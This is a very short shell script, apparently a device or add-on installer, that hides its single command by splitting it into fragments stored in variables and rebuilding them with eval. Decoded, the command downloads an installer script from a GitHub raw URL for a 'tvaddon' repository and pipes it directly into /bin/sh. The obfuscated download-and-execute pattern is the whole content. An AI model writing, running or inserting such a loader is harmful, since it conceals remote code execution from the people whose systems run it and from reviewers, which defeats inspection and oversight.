z="
";Mz='vadd';Rz='r.sh';Cz='ps:/';Gz='serc';Fz='hubu';Bz=' htt';Az='wget';Iz='nt.c';Hz='onte';Lz='37/t';Ez='.git';Jz='om/e';Oz='ain/';Tz='- | ';Vz='/sh';Kz='mil2';Dz='/raw';Qz='alle';Pz='inst';Nz='on/m';Sz=' -O ';Uz='/bin';
eval "$Az$Bz$Cz$Dz$Ez$Fz$Gz$Hz$Iz$Jz$Kz$Lz$Mz$Nz$Oz$Pz$Qz$Rz$Sz$Tz$Uz$Vz"